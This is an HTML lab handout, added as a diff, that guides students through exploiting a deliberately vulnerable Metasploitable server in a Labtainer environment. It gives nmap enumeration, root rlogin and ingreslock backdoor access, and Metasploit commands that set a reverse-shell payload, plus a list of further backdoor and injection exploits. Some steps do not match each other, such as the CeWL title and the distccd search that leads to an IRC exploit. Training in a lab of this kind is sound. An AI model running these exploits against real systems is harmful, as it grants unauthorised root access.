@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CeWL Intelligence Gathering Exercise</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 40px; }
+        h1, h2, h3 { color: #333; }
+        code { background: #f4f4f4; padding: 5px; display: block; border-radius: 5px; }
+        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
+        .container { max-width: 800px; margin: auto; padding: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <h1>Mission Brief: Metasploitable Exploitation Exercise</h1>
+        <h2>Prerequisites:</h2>
+        <p>
+            
+            <ol>
+                <li><a href="https://nps.edu/web/c3o/labtainers">Labtainer VM</a></li>
+                <li>Imodule Installed</li>
+                The imodule for this lab is hosted <a href="https://github.com/tdanko128/imodule.io/raw/main/imodule.tar">here</a> and can be installed with:
+                <pre><code>imodule https://github.com/tdanko128/imodule.io/raw/main/imodule.tar</code></pre>
+                Please note that if you already have this imodule and are not able to find the lab please run:
+                <pre><code>imodule -u</code></pre>
+            </ol>
+        <h2>Operation: Ethreal Backend Server Exploitation</h2>
+        <p><strong>Agent, your mission is to conduct exploits against one of Ethreal's backend servers, a fictitious entity operating under unknown directives. Your objective is to exploit the server using Metasploit.</strong></p>
+
+        <h2>Mission Objectives</h2>
+        <h3>1. Infiltrate the Target Network</h3>
+        <ul>
+            <li>You've gained access to the 192.168.1.0/24 subnet, which hosts a backend server that Ethreal uses.</a>.</li>
+            <li>Confirm successful connectivity and find the vulnerable server.</li>
+        </ul>
+
+        <h3>2. Deploy Intelligence-Gathering Tools</h3>
+        <ul>
+            <li>Execute a series of <strong>nmap</strong> commands to extract key intelligence, including ports and services that can be exploited.</li>
+            <li>Maintain operational security while conducting extractions.</li>
+        </ul>
+
+        <h3>3. Analyze Collected Data</h3>
+        <ul>
+            <li>Use the ports and services enumerated to exploit vulnerable services.</li>
+        </ul>
+
+        <h3>4. File Your Intelligence Report</h3>
+        <ul>
+            <li>Submit NMAP reports and exploit successes. </li>
+            <li>Provide a <strong>detailed analysis</strong> of your findings.</li>
+        </ul>
+
+        <h2>Mission Execution: Metasploit Commands</h2>
+        <h3>Initialize the Lab</h3>
+        <pre><code>labtainer metasploit</code></pre>
+
+        <h3>Enumerate Ports</h3>
+        <p>Reconnaissance has discovered a server running multiple vulnerable services at 192.168.1.2. Use <strong>nmap</strong> to enumerate the ports and identify the services that may be running. You should save the results to file so that it can be opened in <strong>vscode</strong>.</p>
+        <pre><code>nmap -p- 192.168.1.2</code></pre>
+
+        <h3>Exploit rlogin service</h3>
+        <pre><code>rlogin -l root 192.168.1.2</code></pre>
+        <pre><code>cat /root/filetoview.txt</code></pre>
+        
+        <h3>Exploit IngresLock</h3>
+        <pre><code>telnet 192.168.1.2 1524</code></pre>
+        <pre><code>cat /root/filetoview.txt</code></pre>
+
+        <h3>Metasploit Familiarization</h3>
+        <p>Agent, you will be using metasploit to conduct exploits against the Distributed Compiler, Internet Relay Chat Daemon, Very Secure FTP Daemon, Samba, Hypertext PreProcessor Common Gateway Interface and the Postgre SQL instance. We will begin by starting the metasploit console and becoming familiar with the framework. The password for sudo is <strong>'kali'</strong>.</p>
+        <pre><code>sudo msfconsole</code></pre>
+        
+        <p>Once metasploit is launched we can begin by searching for exploits. We will start with the Distributed Compiler.</p>
+        <pre><code>search distccd</code></pre>
+
+        <p>You will see a list of exploits available. To work with an exploit you can run the <strong>Use</strong> command. In this instance we will use the <strong>unreal_ircd_3281_backdoor</strong> exploit.</p>
+        <pre><code>use exploit/unix/irc/unreal_ircd_3281_backdoor</code></pre>
+        <p>It can also be loaded using the number before the exploit.</p>
+        <pre><code>use 0</code></pre>
+
+        <p>In some instances a payload will automatically be selected. In other exploits it may not. To select a payload you can run the <strong>set payload</strong> command. In this example we will use a generic reverse shell payload.</p>
+        <pre><code>set payload cmd/unix/reverse</code></pre>
+
+        <p>Now that we have our exploit and payload set, we need to set some options. There may be options for the exploit or the payload that need to be set. To set an option we use the <strong>set</strong> command with the option then the value. In this example we will be setting the <strong>RHOSTS</strong> option to the victim server.</p>
+        <pre><code>set RHOSTS 192.168.1.2</code></pre>
+
+        <p>We have now loaded an exploit, set a payload, configured our options and we are ready to conduct the exploit. To do this we use the <strong>exploit</strong> command.</p>
+        <pre><code>exploit</code></pre>
+
+        <h3>Conduct Additional Exploits</h3>
+        <p>Using the knowledge we learned in the previous step, conduct exploits with the following:
+            <ul>
+                <li>unreal_ircd_3281_backdoor</li>
+                <li>vsftpd_234_backdoor</li>
+                <li>usermap_script</li>
+                <li>php_cgi_arg_injection</li>
+                <li>postgres_payload</li>
+            </ul>
+        </p>
+
+        <h2>Intelligence Report: Analysis Questions</h2>
+        <p>Please see the report template attached to the assignment.</p>
+
+        <h2>Final Submission</h2>
+        <h3>Deliverables</h3>
+        <ul>
+            <li>Port Enumeration File</li>
+            <li>Lab File</li>
+            <li><strong>Mission Analysis Report</strong> using the report template on the assignment.</li>
+        </ul>
+
+        <p><strong>This mission is time-sensitive. Proceed with caution.</strong> 🚀</p>
+    </div>
+</body>
+</html>
